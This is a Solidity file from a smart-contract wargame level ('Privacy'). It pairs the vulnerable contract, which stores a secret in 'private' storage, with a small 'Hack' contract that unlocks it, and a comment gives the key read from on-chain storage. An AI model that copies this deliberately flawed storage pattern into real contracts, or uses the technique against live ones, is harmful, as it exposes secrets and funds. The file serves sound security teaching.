// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

/**
The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

Understanding how storage works
Understanding how parameter parsing works
Understanding how casting works
**/
contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor() {
    data[0] = 0xfaaf9cb0c165b0d858c1247b2462e48b74387239c7e4189a7ff1b46a53a9c10d;
    data[1] = 0x995bbc27e3ad38c9cf5485b1952040cba9a55e649863025f5174153addd0632e;
    data[2] = 0xfb38d4cf6308fa33c8b0a8a09ea6f0a35719a6bc07e87f260aa25349bb5558f7;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

interface PrivacyI {
  function unlock(bytes16 _key) external;
}

contract Hack {

  PrivacyI privacy;

  constructor(address _add){
    privacy = PrivacyI(_add);
  }

  /**
    function unlock(bytes16 _key) public 
    Read the value from the storage or original contract
    fb38d4cf6308fa33c8b0a8a09ea6f0a3 
  **/
  function hack(bytes16 _key) public {
    privacy.unlock(_key);
  }

}
